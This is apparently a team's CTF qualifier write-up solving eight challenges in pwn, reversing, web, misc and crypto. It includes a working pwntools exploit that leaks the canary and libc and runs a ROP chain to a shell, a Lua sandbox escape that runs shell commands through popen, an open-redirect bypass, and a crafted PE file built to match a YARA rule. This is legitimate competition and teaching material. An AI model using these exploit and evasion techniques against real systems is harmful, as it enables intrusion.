# ACS2024 Quals Writeup by Teh Tarik Cendol

## Table of Contents
- [Audit/no-name minor](#Auditno-name-minor)
- [Rev/CS1338: Script Programming](#RevCS1338-Script-Programming)
- [Rev/Secure Chat](#RevSecure-Chat)
- [Web/Can You REDIRECT Me](#WebCan-You-REDIRECT-Me)
- [Misc/Drone Hijacking](#MiscDrone-Hijacking)
- [Misc/Lutella](#MiscLutella)
- [Misc/Hi Alien](#MiscHi-Alien)
- [Crypto/Secret Encrypt](#CryptoSecret-Encrypt)

# Audit/no-name minor

This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name. 

![image](https://github.com/user-attachments/assets/90df0d94-6313-47c3-98f0-9376ca855de0)

The goal is to get a name. But 

- To buy a name, you need to have money.
- To have money you cannot simply mine, cause it will take a lot of time.
- So you need to loan and then repay them.

The vulnerability lies in the way the program keeps track of the user's loan.

<details>
<summary>Source Code</summary>

```c
// Miner struct
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

// Loan function
void loan(struct MinerAccount *account) {
	uint32_t amount = 0;
    
	printf("How much loan would you like to request?\n");
	if(scanf("%d", &amount) != 1) {
    	printf("Invalid input\n");
    	return;
	}
    
	if(account->debt_balance + amount > MAX_LOAN) {
    	printf("Loan limit exceeded\n");
    	return;
	}

	account->cash += amount;
	account->debt_balance += amount;

	printf("Current cash: $%.2f\n", account->cash);
	printf("Debt balance: $%.2f\n", account->debt_balance);
}
```
</details>

The user's loan is defined as a float, which can be subjected to **floating point inaccuracy.**  A float is 32 bit and it has 1 bit for sign, 23 bit for mantissa and 8 bit for exponent. For integers, the inaccuracy starts at 2^24 (16,777,216). In other words, all integers can be represented as floats up to 2^24 but not beyond that. Specifically, in the range of 2^24 to 2^25, float does not support odd numbers, only even numbers.

<details>
<summary>Proof of Concept</summary>

### Proof of Concept

![image](https://github.com/user-attachments/assets/e75708b0-e383-4faa-bb98-5bbff0919289)

Heres a simple C program that demonstrates this

![image](https://github.com/user-attachments/assets/592a968a-5ee3-4b0d-a6b0-281de6eae7fa)

This is the output

</details>

### Exploiting the Program

Now, we just need to borrow money until 16777216, buy the name, and borrow loan of size $1 until we eventually are able to repay our loan.

![image](https://github.com/user-attachments/assets/ad4d18bc-c5af-45d3-b630-8f4067bb0321)

Buying the name

![image](https://github.com/user-attachments/assets/318be9bc-d5d2-419d-a6cb-637534776cb4)

After borrowing $1

### Buffer Overflow

<details>
<summary>Source Code</summary>

```c
#define MAX_BUF 0x200
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

void change_name(struct MinerAccount *account) {
	if (has_name_rights != 1) {
    	printf("You do not have the right to change your name.\n");
    	printf("Please purchase a name to gain the rights to rename your no-name.\n");
    	return;
	}
	if(account->debt_balance != 0) {
    	printf("You still have debts to repay.\n");
    	printf("Pay off your debts to rename your no-name.\n");
    	return;
	}
	printf("Enter new name.\n");
	read(0, account->name, MAX_BUF);

	printf("Name updated successfully.\n");
}

int main() {
	initialize();
	srand(time(NULL));
	struct MinerAccount account = {0, 0, 0, "no-name"};
	while(1) {
    	int choice;
    	printf("===========================\n");
    	printf("Welcome to %s\n", account.name);
    	printf("Current cash: $%.2f\n", account.cash);
    	printf("Debt balance: $%.2f\n", account.debt_balance);
    	printf("===========================\n");

    	printf("1. Loan\n2. Repayment\n3. Mining\n4. Buy Name\n5. Change Name\n6. Exit\nChoose an action.\n");
    	scanf("%d", &choice);
    	switch(choice) {
        	case 1:
            	loan(&account);
            	break;
        	case 2:
            	repayment(&account);
            	break;
        	case 3:
            	mining(&account);
            	break;
        	case 4:
            	buy_name(&account);
            	break;
        	case 5:
            	change_name(&account);
            	break;
        	case 6:
            	return 0;
        	default:
            	printf("Invalid choice\n");
            	break;
    	}
	}
	return 0;
}
```
</details>

The name in MinerAccount object was assigned to only 0x20 size, but in change_name function we can change up until 0x200. With the help of the printf() in main, we are able to leak the stack canary and libc address after overwriting enough bytes using read(). Putting it all together, we get 

1) We loan 16777216 money
2) Then we buy name so our money no 16777216 - 1337
3) Then if we loan 1 dollar each time, our cash increase, but debt stays the same. So we loan 1 dollar for 1337 times
4) Then can repay all debt
5) Now start the leaking process through name
6) Leak canary
7) Leak libc_start_main address
8) Proceed will rop chain to system

<details>
<summary>Exploit Script</summary>

```py
from pwn import *

exe = './prob'
elf = context.binary = ELF(exe, checksec = False)
io = elf.process()

context.log_level = 'info'

#---------------------------------------------------------------------
sleep(1)
#io.recvuntil(b'Choose an action.\n')
io.sendline(b'1')
#io.recvuntil(b'How much loan would you like to request?\n')
io.sendline(b'16777216')

#io.recvuntil(b'Choose an action.\n')
io.sendline(b'4')

for i in range(1337):
#	io.recvuntil(b'Choose an action.\n')
	io.sendline(b'1')
#	io.recvuntil(b'How much loan would you like to request?\n')
	io.sendline(b'1')

io.recvuntil(b'Choose an action.\n')
io.sendline(b'2')
io.recvuntil(b'How much would you like to repay?\n')
io.sendline(b'16777216')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*44)

io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
canary = io.recv(7).strip()
canary = b'\x00'+canary
canary = unpack(canary)
info(f'Canary: {hex(canary)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*59)
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
libc_add = unpack(io.recv(6).strip().ljust(8,b'\x00'))
info(f'libc leaked : {hex(libc_add)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')

libc = ELF('./libc.so.6')
libc.address = libc_add-0x29d90
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*44
payload += p64(canary)
payload += b'A'*8
payload += p64(libc.address + 0x0000000000029cd6)
payload += rop.chain()
io.sendline(payload)

#--------------------------------------------------------------------
io.interactive()
```
</details>

![image](https://github.com/user-attachments/assets/f1ef7400-45c9-4280-af4d-2e9b33d9747e)

@Capang proud of this :D

# Rev/CS1338: Script Programming

![image](https://github.com/user-attachments/assets/0d5f6ee7-5b36-48fa-8de2-a42a96f3dcb6)

![image](https://github.com/user-attachments/assets/88e3fbcd-01f1-4b0f-8fc2-0a4b20403711)

Given the lua file, we know that it shows the source code of the instance and we are required to connect to the instance and send the correct string in order to get the flag. From the source code, we can see that it loads a file named library.

![image](https://github.com/user-attachments/assets/19b83fbe-001b-4c42-ad58-e83641a02a46)

We tried online decompiler for lua but failed, so ended up using an open source compiler that we learned from https://www.youtube.com/watch?v=nQR1raNkd2s.

![image](https://github.com/user-attachments/assets/e6f88783-f3d0-4860-8d6a-152e4930b4f7)

![image](https://github.com/user-attachments/assets/7aed4f77-0b0e-4b02-9a80-a7991e928c8c)

# Rev/Secure Chat

We are given server.exe, client.exe and OfficeChat.pcapng. The server.exe act as the server for communication, and the client will be acting as the client who start the conversation. This can be seen in the pcap file

![image](https://github.com/user-attachments/assets/9e17b0a9-00f8-4fc1-b7b1-97c044d40e8d)

The high port number is the client. We can verify this by trying to capture loopback address on our system.

![image](https://github.com/user-attachments/assets/bc0fd7d7-5463-4bbe-8f41-9710dde4b504)

### Reversing server.exe

![image](https://github.com/user-attachments/assets/34d47ef0-1de4-4f42-b760-ef107e8ac53e)

The communication process of the server
1. Open socket
2. Accept session
3. Generate key
4. Share key with client
5. Start secure conversation

### Reversing client.exe

![image](https://github.com/user-attachments/assets/2be570e7-1084-4715-bb75-2043389bf274)

The communication process of the client
1. Open socket
2. Start a session with server
3. Receive key from server
4. Start secure communication

Things that we can take note
1. KEY is generated by the server
2. KEY will be shared to the client on network

### Understanding how the KEY being shared on network

![image](https://github.com/user-attachments/assets/c3125e37-e7e0-4a73-aa6e-dca866197ef3)

Before the key is sent on the network, it is encrypted using XOR with kek variable. 

![image](https://github.com/user-attachments/assets/f636ff5b-06f8-44b0-92e8-b265ce2264b2)

This mean, from the given pcap file, we can decrypt the KEY being used by XORing the encrypted key with kek

Decrypted Key

```
0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35
```

![image](https://github.com/user-attachments/assets/d08257a4-b52d-4d1e-b8e8-18ad23be77cf)

The secure conversation is being encrypted using the same XOR method. Now we got the key, we just extract the data, then decrypt using our key.

<details>
<summary>Extracted Data</summary>

```
e6000000
d3f9c8f09e58aff4d7455bd0c5e2dd6cfbf7d2b2d77fe8af92664e82daab8f5aebf1d2be9a59bbacd7675c82daab9858b0b6eef69244ad79587b1acdc0a6dd56ffe5dfbe835ea9acd7665fc7cab0dd53ebe4cef69244e8bb9b6948cbc8aa9e54eaffd5f0db16aaad83284ecacbe38f50ede29af29859a3f8906755c680e3b49431fad6be8744a7ba966a56db8ea5945bfffad3e49216bcb092651ac0d7e3895df7e59aff9142adaa996755cc80e3aa5dffe29aff9559bdacd77155d791e3b55ae93715edd742a0bdd76b56cbcbad8915eef9c8ea9159a4b198285bd7caaa8915f9f9d3f09009
b4000000
c7f3dbf6db1681f884694d82daab9815fbfbdbf79b18e891832849c7cbae8e15f2ffd1fbd741ad7958645682c0a69851bef79afd9843b8b4922855c48eae9850eaffd4f98416bcb7d76f5582c1b59847bee2d2fbd752adac966156d18eb49441f6b6cef69216abb79a7856cbcfad9e50bee2dfff9a18e88f92285ecdc0625241bee1dbf08316bcb7d76553d1dde39c5be7e2d2f79951e8b19a7855d0daa29341bee1d3ea9f16bcb0927b5f82cdab9c5bf9f3c9b0
02010000
d1fe96be835eadf881694fcedafcdd6cfbf7d2b2d77fe8b0966c1ad6c1e38f50edf3cebe9e42e8b4967b4e82d9a6985ebef7dcea9244e8ac9f6d1ad1d7b08950f3b6cfee9357bcbdd92876c7dae39050bee2d2f7995de6f6d92878c7c8ac8f50bedf9af99242e8ac9f694e82c8ac8f15e7f9cfb2d752a1bcd77155d78ea5945bf7e5d2be8553beb1927f53ccc9e3895dfbb6d6f19658e8aa927855d0dae39b47f1fb9aea9f53e8aa92695682cbb08954eaf39afa9246a9aa83655fccdafcdd61f6f3c33f5844adf8806953d6c7ad9a15f1f89af18244e8be926d5ec0cfa09615eaf99aee8559abbd926c1ad5c7b79515ffb6d8f79016bcaa966649c3cdb7945af0b8
c7000000
d9e4dfff831ae8ac9f6954c9ddeddd74f2e4d3f99f42e4f883605f82c0a68a15eef7c9ed8059babcd76e55d08eb79550bee0dbeb9b42e8b1842818e3ed908671aec9f4f1a369bd8bc4576292dc9c9b05ccc9dfd0946491a8c03955ccf1f7b172aee48bca9f7bb5fad92870d7ddb7dd58fffddfbe8443babdd77155d78eb68d51ffe2dfbe8e59bdaad77a5fc1c1b19946bef7d4fad752a7b656a74e82ddab9c47fbb6d3ead741a1ac9f285bccd7ac9350bef3d6ed9216a7ad837b53c6cbe3895dfbb6cefb965be6
1a000000
cef3c8f89255bcf6d75c5bcec5e3895abeefd5ebd745a7b79929
```
</details>

<details>
<summary>Solve Script</summary>

```py
kek = [0x12, 0x9F, 0xE8, 0x31, 0x52, 0xB2, 0x9A, 0x1D, 0xA9, 0xB0, 0x0D, 0x42, 0xD6, 0x3C, 0x77, 0x1E] #16
key =[0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35]

flag = []
secret = [0xd9,0xe4,0xdf,0xff,0x83,0x1a,0xe8,0xac,0x9f,0x69,0x54,0xc9,0xdd,0xed,0xdd,0x74,0xf2,0xe4,0xd3,0xf9,0x9f,0x42,0xe4,0xf8,0x83,0x60,0x5f,0x82,0xc0,0xa6,0x8a,0x15,0xee,0xf7,0xc9,0xed,0x80,0x59,0xba,0xbc,0xd7,0x6e,0x55,0xd0,0x8e,0xb7,0x95,0x50,0xbe,0xe0,0xdb,0xeb,0x9b,0x42,0xe8,0xb1,0x84,0x28,0x18,0xe3,0xed,0x90,0x86,0x71,0xae,0xc9,0xf4,0xf1,0xa3,0x69,0xbd,0x8b,0xc4,0x57,0x62,0x92,0xdc,0x9c,0x9b,0x05,0xcc,0xc9,0xdf,0xd0,0x94,0x64,0x91,0xa8,0xc0,0x39,0x55,0xcc,0xf1,0xf7,0xb1,0x72,0xae,0xe4,0x8b,0xca,0x9f,0x7b,0xb5,0xfa,0xd9,0x28,0x70,0xd7,0xdd,0xb7,0xdd,0x58,0xff,0xfd,0xdf,0xbe,0x84,0x43,0xba,0xbd,0xd7,0x71,0x55,0xd7,0x8e,0xb6,0x8d,0x51,0xff,0xe2,0xdf,0xbe,0x8e,0x59,0xbd,0xaa,0xd7,0x7a,0x5f,0xc1,0xc1,0xb1,0x99,0x46,0xbe,0xf7,0xd4,0xfa,0xd7,0x52,0xa7,0xb6,0x56,0xa7,0x4e,0x82,0xdd,0xab,0x9c,0x47,0xfb,0xb6,0xd3,0xea,0xd7,0x41,0xa1,0xac,0x9f,0x28,0x5b,0xcc,0xd7,0xac,0x93,0x50,0xbe,0xf3,0xd6,0xed,0x92,0x16,0xa7,0xad,0x83,0x7b,0x53,0xc6,0xcb,0xe3,0x89,0x5d,0xfb,0xb6,0xce,0xfb,0x96,0x5b,0xe6]

for i in range(len(secret)):
    enc = secret[i]
    enc2 = key[i % 16]
    tmp = enc ^ enc2
    flag.append(chr(tmp))

print("".join(flag))
```
</details>

> Flag : ACS{D0_NoT_uS3_X0r_f0R_eNcRYp71on_4LG0r1ThM}

# Web/Can You REDIRECT Me

![image](https://github.com/user-attachments/assets/5c5cd6fb-d1d8-44c4-880f-b2b4f5cefee0)

![image](https://github.com/user-attachments/assets/79e686e2-ed44-49b5-9554-ce8d516c11de)

We were greeted with a page with almost nothing in it. Except for the provided url parameters:
?url=Report_URL

Let’s take a deeper look into the source code given and perform code analysis/audit.

![image](https://github.com/user-attachments/assets/6295d402-ada0-4ca0-bacb-2baab98da91e)

app.js and utils.js seem like the only relevant files for the challenge. Let’s dissect it real quick.

The framework of the web app is very similar to the several other web challenges, of which are based on Express (NodeJS) and includes Puppeteer methods in its codebase.

![image](https://github.com/user-attachments/assets/fbd57e53-da36-4283-a7b2-4eeb895b7931)

There’s nothing really interesting in the utils.js file, except that now we’ve learned the Puppeteer session will be utilizing the goto method, which navigates the headless Chrome browser to the url fed by the user

![image](https://github.com/user-attachments/assets/6faa526c-cf7e-46e3-80f5-a5c66f7417ba)

Route Overview:

The `/report` route expects a query parameter url. It checks if the URL's hostname is www.google.com. If the condition fails, it responds with I ONLY trust GOOGLE.

Critical Checks:

```
Hostname Check: url.hostname != "www.google.com". This ensures the hostname is strictly www.google.com.
Protocol Check: url.protocol != "http:" && url.protocol != "https:". Only http: or https: protocols are allowed.
Bot Processing: The bot visits the provided URL. If the final URL's hostname isn't www.google.com, the flag is displayed.
```

URLs that don't have the URL protocol; http or https that are being passed onto the parameter will result in the output NOPE!

The trick was to pass the hostname validation but somehow make the bot end up on a different hostname. Immediately, I remembered something about Google AMP (Accelerated Mobile Pages). If you hit a URL like this; https://google.com/amp/facebook.com. It passes the hostname check (www.google.com), but when visited, it redirects to facebook.com. Jackpot!

Execution: Hit the /report endpoint with the payload /report?url=https://www.google.com/amp/facebook.com

The server validated the hostname as www.google.com. The bot visited the URL, got redirected by Google AMP to facebook.com. The final check failed because of facebook.com != www.google.com, so the app returned the flag in the JavaScript alert.


> Flag: ACS{It_i5_JU$7_tr1Cky_tRiCK}

# Misc/Drone Hijacking

![image](https://github.com/user-attachments/assets/0a3c7464-0943-4e4f-b079-6b6008a980f3)

![image](https://github.com/user-attachments/assets/ad260165-e014-464a-a72d-ee540b3efad5)

We are given a pcap file with RTP streams. Since it is a drone, we suspect that there might be video streaming. There’s a way to convert RTP to H264 manually in Wireshark according to this [forum](https://stackoverflow.com/questions/26164442/decoding-rtp-payload-as-h264-using-wireshark). H.264 is a video compression standard. The goal is to convert to H264 so that we can view the video. In Edit -> Preferences, set the payload type to 96

![image](https://github.com/user-attachments/assets/5e9b78ee-501a-4e52-bce0-5175f42dfcef)

Then, we will see that RTP stream has been converted to H264. We can install Wireshark plugin to extract H.264 stream from the RTP stream.

Here’s the plugin that I found:
https://github.com/volvet/h264extractor/blob/master/rtp_h264_extractor.lua

Just put into the plugin folder where we install our Wireshark and the plugin will appear in Tools section.

![image](https://github.com/user-attachments/assets/944885e1-a02b-4cca-a153-e1edd0f04bd0)

We will get .264 file, and we can use ffmpeg to convert it to mp4.

![image](https://github.com/user-attachments/assets/1d53d7e9-fcad-4aab-aa27-bb0c34918005)

# Misc/Lutella

![image](https://github.com/user-attachments/assets/2cfa7bd5-8b8a-4718-ad71-f444a44acb45)

![image](https://github.com/user-attachments/assets/e99e3050-4170-4098-9ce4-855fff0e02e2)

In this challenge, we were tasked with exploiting a Lua-based sandbox environment that had several restrictions, particularly on system calls and sensitive libraries. The goal was to find a way to escape the sandbox and retrieve the flag.

Lua is a lightweight, high-level scripting language commonly embedded in applications to provide extensible scripting capabilities. It is known for its simplicity and flexibility, but in this challenge, we were working with a sandboxed Lua environment, meaning that our access to certain functions and libraries was restricted.

Typically, a sandbox in Lua might restrict access to the following:

System-level functions like os.execute(), os.popen(), and io.popen().
The debug library, which can be used for introspection and manipulation of Lua's internal state.
The ability to interact with the file system.

In this environment, we were given limited access to the Lua language but could exploit certain exposed functionalities to break out of the sandbox.

![image](https://github.com/user-attachments/assets/380b03dd-a648-42fe-9585-9f5a7434e068)

The crux of the exploit involved using Lua's debug library and the internal debug.getregistry() function. The sandbox restricted access to system libraries like os and io, but we were able to bypass these restrictions by directly interacting with Lua's internal registry.

We start by calling the debug.getregistry() function, which returns a global registry table that Lua uses to manage all objects internally. This registry is usually inaccessible in a sandboxed environment, but it wasn’t properly restricted here. By accessing the registry, we were able to locate internal functions and libraries that were not otherwise exposed.


Within the registry, there was an exposed popen function, which allows us to execute system commands. This was a critical vulnerability because it provided a way to interact with the underlying operating system, despite the sandbox restrictions. Normally, Lua’s io.popen or os.popen would be restricted, but by leveraging the registry, we could access and use this function to run shell commands.

Considering typical Lua sandbox escape techniques, I first tried to exploit the debug.getregistry() function. The idea was to look for unsafe methods or libraries available in the registry. 

debug.getregistry().safe_method.popen("cat ./flag"):

![image](https://github.com/user-attachments/assets/0135b2c9-1dc7-4a82-9314-e92cc60789b3)

However, this command failed, as the prompt did not return the flag or any meaningful output.

After further testing, I adjusted the approach and used the print function to display the result explicitly:

```
print(debug.getregistry().safe_method.popen("cat ./flag"):read("*a"))
```

![image](https://github.com/user-attachments/assets/aaad2671-cb34-48d7-9136-ba67e1ab0fbd)

> Flag: ACS{Toast_and_chocolate_are_a_fantastic_combination}

# Misc/Hi Alien

![image](https://github.com/user-attachments/assets/4a5b571e-b968-41a0-b8d2-106faee97ab9)

In the website given, we are allowed to upload a file. However, the challenge also provides us with YARA rules.

<details>
<summary>YARA rule</summary>

```
import "pe"
import "math"
import "hash"

rule acs_rule {
    meta:
        description = "ACS"
        author = "ACS"
        date = "05/11/2024"
        version = "1.0"

    strings:
        $acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 }

    condition:
        uint16(0) == 0x5A4D and
        math.entropy(0, filesize) > 6 and
        pe.is_32bit() == 0 and
        pe.version_info["CompanyName"] == "acs" and
        pe.number_of_imported_functions == 62 and
        pe.imports("acs.dll") == 3 and
        pe.number_of_resources == 1 and
        pe.number_of_sections == 23 and
        $acs and
        $acs in ((pe.sections[pe.section_index(".acs")].raw_data_offset) .. (pe.sections[pe.section_index(".acs")].raw_data_offset + pe.sections[pe.section_index(".acs")].raw_data_size)) and
        for any section in pe.sections : (
            section.name == ".acs" and
            math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) > 61.8 and
            math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) < 61.9 and
            $acs at section.raw_data_offset + 0x2f
        ) or
        hash.md5(0, filesize) == "33baf1c19ca30dac4617dbab5f375efd"
}
```
</details>

<details>
<summary>Exe Source Code</summary>

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>

extern "C" __declspec(dllimport) void Function1();
extern "C" __declspec(dllimport) void Function2();
extern "C" __declspec(dllimport) void Function3();
extern "C" __declspec(dllimport) void Function4();
extern "C" __declspec(dllimport) void Function5();
extern "C" __declspec(dllimport) void Function6();
extern "C" __declspec(dllimport) void Function7();

unsigned char randomData[1024 * 14] = {
    0x85, 0xF7, 0x2C, 0x6F, 0x75, 0xC2, 0xF7, 0xD0,
    …
   (REDACTED)
    …
    0x20, 0x67, 0xE1, 0xE6, 0x62, 0xE9, 0x47, 0x12,
};
unsigned char randomData2[1024 * 14] = {
    0x1D, 0x8C, 0xD5, 0x61, 0xE1, 0x89, 0x58, 0xD5,
   …
   (REDACTED)
   …
    0xF1, 0x0C, 0x00, 0x9F, 0x48, 0x19, 0x45, 0x88,
};

int main(){
    std::vector<unsigned char> pattern = {
        0x90, 0x90, 0x90, 0x90, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3
    };

    Function1();
    Function2();
    Function3();
    Function4();
    Function5();
    Function6();
    Function7();

    return 0;
};
```
</details>

This is the code which imports exactly 62 functions, with 3 of it being from acs.dll. Then, there are large arrays of random data to pass the entropy check.

<details>
<summary>Version.rc</summary>

```c
#include <windows.h>

1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
FILEFLAGSMASK 0x3F
FILEFLAGS 0x0
FILEOS VOS__WINDOWS32
FILETYPE VFT_APP
FILESUBTYPE 0x0

BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904E4" // Language and codepage (US English, Unicode)
        BEGIN
            VALUE "CompanyName", "acs"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1252
    END
END
```
</details>

Version.rc is to be compiled with the cpp file to match `pe.version_info["CompanyName"] == "acs"`

<details>
<summary>acs.cpp</summary>

```cpp
#include <iostream>
#include <windows.h>

extern "C" __declspec(dllexport) void Function1();
extern "C" __declspec(dllexport) void Function2();
extern "C" __declspec(dllexport) void Function3();

void Function1() {
    std::cout << "Function1 from acs.dll called!" << std::endl;
}

void Function2() {
    std::cout << "Function2 from acs.dll called!" << std::endl;
}

void Function3() {
    std::cout << "Function3 from acs.dll called!" << std::endl;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
```
</details>

<details>
<summary>fake.cpp</summary>

```cpp
#include <iostream>
#include <windows.h>

extern "C" __declspec(dllexport) void Function4();
extern "C" __declspec(dllexport) void Function5();
extern "C" __declspec(dllexport) void Function6();
extern "C" __declspec(dllexport) void Function7();

void Function4() {
    std::cout << "Function4 from acs.dll called!" << std::endl;
}

void Function5() {
    std::cout << "Function5 from acs.dll called!" << std::endl;
}

void Function6() {
    std::cout << "Function6 from acs.dll called!" << std::endl;
}

void Function7() {
    std::cout << "Function7 from acs.dll called!" << std::endl;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
```
</details>

A fake dll to match the number of function imports

The code above will pass most of the rules already, the hardest part was adding a section that matches the standard deviation range of 61.8 - 61.9. After a lot of trial and testing, we made a binary file with random data inside, manually modifying bytes until we achieve the desired standard deviation. We also have to match the condition ($acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 }) where $acs must be located at an offset of +0x2f. We can run these commands to add the section to the exe.

```sh
objcopy --add-section .mysection=data.txt test.exe test.exe
objcopy --add-section .mysection2=data.txt test.exe test.exe 
objcopy --add-section .acs=acssection.bin test.exe test.exe
```

### Acssection.bin

![image](https://github.com/user-attachments/assets/2610fc2c-1521-42c8-9b88-ed54b8fb6910)

One last step before we match everything, when we compile with the version.res which will make the number of resources into 2. We will use CFF Explorer to just delete the resource

![image](https://github.com/user-attachments/assets/f0318f82-030c-45e8-95e8-e78deab7065d)

Then, just upload the file.

![image](https://github.com/user-attachments/assets/83ce001f-827a-48e3-a46a-321e1353d5cc)

> Flag : ACS{97d9bad8791993f95050bf4668f3e1351f39b21fafeb986822915ecc71d75f77}

# Crypto/Secret Encrypt

![image](https://github.com/user-attachments/assets/43b28ad0-f7e1-4682-8ff3-3ad67ec2c97d)

After analyzing the secret function for a while, we can see that the number of iterations does not change because it uses the same secret3. Since secret1 is also a global variable, it will be updated every time we run this function.

![image](https://github.com/user-attachments/assets/aa4fbd6a-56f9-4082-b3a9-bbb2dd8b52d0)

This is the equations that we can derive from the script above. We know that k is the fixed number of iterations that we have to find. We know that k multiplied with output 1 we can get output 2 and same goes for output 3.

![image](https://github.com/user-attachments/assets/91770315-977b-47d8-8fa5-df71715afb86)

Then we will use simultaneous equation to solve for k and remove S4. Then we can factorize both equations. From the first equation there are 2 unknowns so we cannot solve that but the second equation, we have everything we need to solve for k. After getting the value for k, we can solve for S1 and get the p_rsa and we can RSA decrypt for the flag.

<details>
<summary>Solve Script</summary>

```py
from Crypto.Util.number import *

secret_out=[2300421886456816351333038657690265151708360443867130686953248448630531093021776734868674112240095418467093081756335930515843525383128738534202096348377560386173570623441341520395024918493491724749213178102009151013218735777147941242873009226181626903461558777748363070242458097134402254164979416319966395006, 118964893465008760906148513803880740427426131597706706568706005798920125121985562712819885692864935956027782962836691988567169040365350150416055346960755633472875717465898683139277419122088292007600766276511481224635277838009319684482964767210192366303533764466354302709679013042872343430366540326193987064645, 90822909054820019495848981290779830597424633150254073315406974106438388320012099062499510476986746519431915469091680034456400733513195561250293814032158684572016278396810686958474205299987143330650890060883372170577823300904023529858782819407737240576117609136514644966087947730563905446620136904194643698198]

n=20009817089569599969538500034726137113860180378444144520680720380692155921700313466801113645321964859714346152831289324522691712373980295752612143787805513744596845142947565574859214431250136840018060927071875139532338460212335213420284901918516101557291315678272762415979902727124588156079493807073200546288791822792848832017274870268954552045671250363562973791606622534055827461929215079320844719649763363790174187688772315493266741429035524622360771778144037322337653884113230944318554468904277796127275077196154359393948582189156560613101425299832337719592901727785865373121552005054050809254799001160651919041273

enc= 17344290788163015442564038139247334246060642996020446850904852322039560290118766056392172895820951735374997354582709325518744702347901024840385769459937997819017954914367135733032234042160950809727187366403932100980467655542279928058464435224759900315683519706073455878465191841286965255617968372213737731942678587359354085082039577400390336690085883027339539322625462749425424798876860559141668103407199665082352825962061580373066150843935421008052782270096495723400071390700979281961303531001562910399929551753423625553318250211321347445434080128164118499925998330651792925936876711132409460643630484260433317617505

s2 = 2**1024
out21 = (secret_out[2] - secret_out[1])%s2
out10 = (secret_out[1] - secret_out[0])%s2
k = (out21*pow(out10,-1,s2))%s2 # k should be same for all iteration since s3 never changed
out0p = (out10 * pow(k,-1,s2))%s2
s1 = (secret_out[0] - out0p)%s2
p = s1
q = n//p

'''
p = 132790300101366058515958319162299029496405124107273636270906558644633499211040666269535156087138615191931144220498705500614664040267695307905904116245626464026778297953182366717423923687292230514699937937252522698285265470300659804575877503151767844550730621058684052444790791025203953209758824961680910607517
q = 150687339920875382113791022506874143187279559347292591253769866286725301123955523995561688927048985382258572221281989736370068559920886474787642952585643202043783643860132711115711465813075539209137582922811552548124014088150222590245888319427478214922187640615079569173552234835682647189213206202677621977869
'''

assert p*q == n

phi = (p-1)*(q-1)
d = pow(65537,-1,phi)

print(long_to_bytes(pow(enc,d,n)))
```
</details>
